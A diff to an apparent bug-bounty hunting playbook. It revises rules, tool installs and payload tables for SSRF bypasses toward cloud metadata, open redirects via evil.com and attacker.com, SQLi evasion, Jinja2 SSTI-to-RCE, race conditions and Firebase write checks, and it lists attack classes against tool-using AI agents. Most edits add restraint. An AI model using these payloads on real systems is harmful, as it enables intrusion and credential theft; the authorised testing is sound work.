@@ -11,7 +11,7 @@ Full pipeline: Recon -> Learn -> Hunt -> Validate -> Report. One skill for every
 
 > **"Can an attacker do this RIGHT NOW against a real user who has taken NO unusual actions -- and does it cause real harm (stolen money, leaked PII, account takeover, code execution)?"**
 >
-> If the answer is NO -- **STOP. Do not write. Do not explore further. Move on.**
+> If the answer is NO -- **do not write a report.** A reflection, error, or lookup is not a finding. Try one chain step from the conditional-chain table. If that does not produce attacker-held impact, record the negative and keep hunting other in-scope surface.
 
 ### Theoretical Bug = Wasted Time. Kill These Immediately:
 
@@ -38,15 +38,15 @@ Full pipeline: Recon -> Learn -> Hunt -> Validate -> Report. One skill for every
 4. **Validate before writing** -- check CHANGELOG, design docs, deployment scripts FIRST
 5. **One bug class at a time** -- go deep, don't spray
 6. **Verify data isn't already public** -- check web UI in incognito before reporting API "leaks"
-7. **5-MINUTE RULE** -- if a target shows nothing after 5 min probing (all 401/403/404), MOVE ON
+7. **401/403/404 IS A LEAD** -- fingerprint the stack and try one bypass pass (headers, verb, path normalization). Leave the host only when it is out of scope or has no DNS/TLS.
 8. **IMPACT-FIRST HUNTING** -- ask "what's the worst thing if auth was broken?" If nothing valuable, skip target
 9. **CREDENTIAL LEAKS need exploitation proof** -- finding keys isn't enough, must PROVE what they access
-10. **STOP SHALLOW RECON SPIRALS** -- don't probe 403s, don't grep for analytics keys, don't check staging domains that lead nowhere
+10. **DON'T SPIRAL ON NOISE** -- a 403 is worth one bypass pass. Skip analytics-only keys and hosts that are out of scope. Do not abandon an in-scope 403 after a single status code.
 11. **BUSINESS IMPACT over vuln class** -- severity depends on CONTEXT, not just vuln type
 12. **UNDERSTAND THE TARGET DEEPLY** -- before hunting, learn the app like a real user
 13. **DON'T OVER-RELY ON AUTOMATION** -- automated scans hit WAFs, trigger rate limits, find the same bugs everyone else finds
 14. **HUNT LESS-SATURATED VULN CLASSES** -- XSS/SSRF/XXE have the most competition. Expand into: cache poisoning, Android/mobile vulns, business logic, race conditions, OAuth/OIDC chains, CI/CD pipeline attacks
-15. **ONE-HOUR RULE** -- stuck on one target for an hour with no progress? SWITCH CONTEXT
+15. **ROTATE, DON'T ABANDON** -- an hour on one endpoint with no new signal means switch vuln class or endpoint on the same in-scope target. Drop the target only when scope is exhausted or the program is out of time.
 16. **TWO-EYE APPROACH** -- combine systematic testing (checklist) with anomaly detection (watch for unexpected behavior)
 17. **T-SHAPED KNOWLEDGE** -- go DEEP in one area and BROAD across everything else
 
@@ -67,7 +67,7 @@ Full pipeline: Recon -> Learn -> Hunt -> Validate -> Report. One skill for every
 | XSS (stored) | Check if HttpOnly is set on session cookie | Session hijack -> ATO |
 | Open redirect | OAuth redirect_uri accepts your domain | Auth code theft -> ATO |
 | S3 bucket listing | Enumerate JS bundles | Grep for OAuth client_secret -> OAuth chain |
-| Rate limit bypass | OTP brute force | Account takeover |
+| Rate limit absent on OTP/reset | Classify the limiter. Compute token entropy against the observed window. Do not run the keyspace. | ATO only if a token you were issued is reusable, non-expiring, or derived without guessing |
 | GraphQL introspection | Missing field-level auth | Mass PII exfil |
 | Debug endpoint | Leaked environment variables | Cloud credential -> infrastructure access |
 | CORS reflects origin | Test with credentials: include | Credentialed data theft |
@@ -190,13 +190,13 @@ Client -> CDN -> Load Balancer -> App Server -> Database
 | Tool | Use | Install |
 |------|-----|---------|
 | arjun | Hidden parameter discovery | `pip3 install arjun` |
-| paramspider | URL parameter mining | `pip3 install paramspider` |
+| paramspider | URL parameter mining | `git clone https://github.com/devanshbatham/ParamSpider` (not on PyPI) |
 | kiterunner | API endpoint brute | `go install github.com/assetnote/kiterunner/cmd/kr@latest` |
-| cloudenum | Cloud asset enumeration | `pip3 install cloud_enum` |
+| cloudenum | Cloud asset enumeration | `git clone https://github.com/initstring/cloud_enum && pip3 install -r cloud_enum/requirements.txt` (not on PyPI) |
 | trufflehog | Secret scanning | `brew install trufflehog` |
 | gitleaks | Secret scanning | `brew install gitleaks` |
-| XSStrike | Advanced XSS scanner | `pip3 install xsstrike` |
-| SecretFinder | JS secret extraction | `pip3 install secretfinder` |
+| XSStrike | Advanced XSS scanner | `git clone https://github.com/s0md3v/XSStrike` (PyPI `xsstrike` is an unofficial re-upload) |
+| SecretFinder | JS secret extraction | `git clone https://github.com/m4ll0k/SecretFinder` (PyPI `secretfinder` is a different, unrelated package) |
 | sqlmap | SQL injection | `pip3 install sqlmap` |
 | subzy | Subdomain takeover | `go install github.com/LukaSikic/subzy@latest` |
 
@@ -232,8 +232,8 @@ cat semgrep-results.json | jq '.results[] | select(.extra.severity == "ERROR") |
 # THE ONE RULE: Always use -ac (auto-calibrate filters noise automatically)
 ffuf -w wordlist.txt -u https://target.com/FUZZ -ac
 
-# Authenticated raw request file — IDOR testing (save Burp request to req.txt, replace ID with FUZZ)
-seq 1 10000 | ffuf --request req.txt -w - -ac
+# IDOR: swap one ID between two accounts you control. Do not walk an ID range.
+# ffuf is for hidden paths and parameter names, not for enumerating other users.
 
 # Authenticated API endpoint brute
 ffuf -u https://TARGET/api/FUZZ -w wordlist.txt -H "Cookie: session=TOKEN" -ac
@@ -341,7 +341,8 @@ curl -s "https://hackerone.com/graphql" \
 **Laravel**: `/horizon`, `/telescope`, `/.env`, `/storage/logs/laravel.log`
 **WordPress**: `/wp-json/wp/v2/users`, `/xmlrpc.php`, `/?author=1`
 **Node.js**: `/.env`, `/graphql` (introspection), `/_debug`
-**AWS Cognito**: `/oauth2/userInfo` (leaks Pool ID), CORS reflects arbitrary origins
+**Next.js**: `x-middleware-subrequest` (CVE-2025-29927) — load `hunt-nextjs`. Patched Next ignores the header; a status change without body-diff is not a bypass.
+**AWS Cognito**: `/oauth2/userInfo` (leaks Pool ID), CORS reflects arbitrary origins. Identity-pool unauth role → `cloud-iam-deep`.
 
 ## Source Code Recon
 ```bash
@@ -547,7 +548,7 @@ grep -rn "TODO\|FIXME\|not signed\|not verified\|for now" --include="*.rs" | gre
 | IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
 | Redirect chain | `http://attacker.com/302->http://169.254.169.254` | Check each hop |
 | DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external, fetch = internal |
-| URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
+| Userinfo/fragment confusion | `http://attacker.com%2523@169.254.169.254/` or `http://169.254.169.254%2F%2E%2E%2F@attacker.com` | `%2523`=`#`; validator reads host as `attacker.com` (userinfo), fetcher connects to the real host. Target must be the host, not the userinfo |
 | Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
 | Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Redis/other protocols |
 
@@ -582,7 +583,7 @@ Use these when chaining open redirect into OAuth code theft:
 | Null byte | `https://evil.com%00target.com` | Some parsers truncate at null |
 | Parameter pollution | `?next=target.com&next=evil.com` | Last value wins |
 | Path confusion | `/redirect/..%2F..%2Fevil.com` | Path traversal in redirect |
-| Unicode normalization | `https://evil.com/target.com` | Visual confusion |
+| Homoglyph / punycode | `https://evil．com` (U+FF0E) or `https://xn--e1awd7f.com` | Fullwidth-dot / IDNA. `https://evil.com/target.com` is path confusion, not unicode |
 
 ## File Upload
 
@@ -616,7 +617,7 @@ Use these when chaining open redirect into OAuth code theft:
 - [ ] Gift card redemption
 - [ ] Fund transfer / withdrawal
 - [ ] Voting / rating limits
-- [ ] OTP verification brute via race
+- [ ] OTP/code reuse: race the SAME code you were just issued (~20 in one burst). Do not guess other codes. Stop after one extra redeem.
 
 ```bash
 seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
@@ -629,12 +630,12 @@ wait
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
-                           requestsPerConnection=1,
+                           requestsPerConnection=100,
                            pipeline=False,
                            engine=Engine.BURP2)
     for i in range(20):
         engine.queue(target.req, gate='race1')
-    engine.openGate('race1')  # all 20 fire in a single TCP packet
+    engine.openGate('race1')  # BURP2 + HTTP/2 coalesces all 20 into one TCP packet (true single-packet). requestsPerConnection=1 would force a connection per request and defeat it; HTTP/1.1-only targets degrade to last-byte sync.
 
 def handleResponse(req, interesting):
     table.add(req)
@@ -695,8 +696,8 @@ SE/**/LECT * FROM users
 SeLeCt * FrOm uSeRs
 -- URL encoding
 %27 OR %271%27=%271
--- Unicode apostrophe
-' OR '1'='1
+-- Unicode / fullwidth apostrophe (U+FF07) — not the ASCII quote
+%EF%BC%87 OR %EF%BC%871%EF%BC%87=%EF%BC%871
 ```
 
 ## GraphQL
@@ -714,14 +715,8 @@ SeLeCt * FrOm uSeRs
 { node(id: "dXNlcjoy") { ... on User { email phoneNumber ssn } } }
 ```
 
-### Batching Attack (Rate Limit Bypass)
-```json
-[
-  {"query": "{ login(email: \"user@test.com\", password: \"pass1\") }"},
-  {"query": "{ login(email: \"user@test.com\", password: \"pass2\") }"},
-  "...100 more..."
-]
-```
+### Batching (does the limiter count the batch as one request?)
+Send a batch of 2–3 identical benign queries and compare rate-limit headers to a single request. If the batch counts as one unit, write down the limiter class and the window. Do not submit a password list. A password oracle is not proven by guessing; it is proven by showing your own account's check is answered inside a batch that the limiter treated as one call.
 
 ## LLM / AI Features
 
@@ -744,7 +739,7 @@ When target has AI agents with tool access, these are the 10 attack classes:
 | ASI04 | Privilege escalation | Use AI to access admin-only tools -- agent has broader perms than user |
 | ASI05 | Indirect injection | Poison document/URL the AI processes -- hidden instructions in fetched content |
 | ASI06 | Excessive agency | AI takes destructive actions without confirmation -- delete, send, pay |
-| ASI07 | Model DoS | Craft inputs that cause infinite loops, excessive token usage, or OOM |
+| ASI07 | Model DoS | Classify only. Do not send inputs meant to loop, exhaust tokens, or OOM the model. |
 | ASI08 | Insecure output | AI generates XSS/SQLi/command injection in its output that gets rendered |
 | ASI09 | Supply chain | Compromised plugins/tools/MCP servers the AI calls |
 | ASI10 | Sensitive disclosure | AI reveals internal configs, API keys, system prompts, user data |
@@ -1121,12 +1116,13 @@ sisakulint findings are **potentially exploitable** — not confirmed bugs. Ever
 
 ### Detection Payloads
 ```
-{{7*7}}          -> 49 = Jinja2 / Twig / generic
-${7*7}           -> 49 = Freemarker / Pebble / Velocity
+{{7*7}}          -> 49 = Jinja2 / Twig
+${7*7}           -> 49 = Freemarker / Pebble / Velocity / Thymeleaf / Spring EL
 <%= 7*7 %>       -> 49 = ERB (Ruby)
-#{7*7}           -> 49 = Mako / some Ruby
-*{7*7}           -> 49 = Spring (Thymeleaf)
-{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
+#{7*7}           -> 49 = Spring SpEL / Ruby string interpolation (Mako uses ${7*7}, not #{})
+[[${7*7}]]       -> 49 = Thymeleaf 3 inline text
+{{7*'7'}}        -> 7777777 = Jinja2 (Twig returns 49)
+# *{7*7} is a Thymeleaf selection expression. It usually does not evaluate in an injection sink.
 ```
 
 ### Where to Test
@@ -1140,6 +1136,7 @@ ${7*7}           -> 49 = Freemarker / Pebble / Velocity
 ### Jinja2 -> RCE (Python / Flask)
 ```python
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
 ```
 
 ### Twig -> RCE (PHP / Symfony)
@@ -1202,10 +1199,7 @@ email=victim@company.com
 After clicking reset link, if page loads external resources -> token in Referer header to external domain.
 
 ### Path 3: Predictable / Weak Reset Tokens
-```bash
-# If token < 16 hex chars or numeric only -> brute-forceable
-ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
-```
+If a token you were issued is shorter than 16 hex characters or is numeric, compute the space (`10^n` or `16^n`) against the observed limit (a handful of requests, then read the rate-limit headers). Do not exhaust it. The proof is a token you can *derive* — timestamp, user id, or a formula that predicts the next token on your own account — or reuse/non-expiry in Path 4. A short token you did not derive is a lead, not an ATO.
 
 ### Path 4: Token Not Expiring / Reuse
 Request token -> wait 2 hours -> use it -> still works? Request token #1 -> request token #2 -> use token #1 -> still works?
@@ -1248,14 +1242,22 @@ http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def
 
 # Azure (needs header Metadata: true):
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# IMDSv2, only if the SSRF can set the method and a header:
+# PUT /latest/api/token  with  X-aws-ec2-metadata-token-ttl-seconds: 21600
+# then GET the credentials path with  X-aws-ec2-metadata-token: <token>
+# Hop limit defaults to 1 — a container SSRF often cannot reach the token.
+# ECS/Fargate is not this address:
+# http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
 ```
 
 ### Firebase Open Rules
 ```bash
 curl -s "https://TARGET-APP.firebaseio.com/.json"
-# If data returned -> open read
-curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'
-# If success -> open write -> Critical
+curl -s "https://TARGET-APP-default-rtdb.firebasedatabase.app/.json"   # projects created since ~2021 default to this host shape (also regional variants like ...europe-west1.firebasedatabase.app)
+# Data that is not yours -> open read (proven). null/empty -> not proven.
+# Write only if the engagement allows it: PUT one unique key, confirm, DELETE that key, stop.
+# Do not leave a "pwned" node behind.
 ```
 
 ### Exposed Admin Panels
@@ -1378,7 +1380,7 @@ These low findings become valid bugs when chained:
 | Clickjacking | + sensitive action + PoC | Account action |
 | CORS wildcard | + credentialed exfil | Data theft |
 | CSRF | + sensitive state change | Account takeover |
-| No rate limit | + OTP brute force | ATO |
+| No rate limit on an auth endpoint | + a token you derived, reused, or showed does not expire | ATO |
 | SSRF (DNS only) | + internal access proof | Internal network access |
 | Host header injection | + password reset poisoning | ATO |
 | Self-XSS | + login CSRF | Stored XSS on victim |
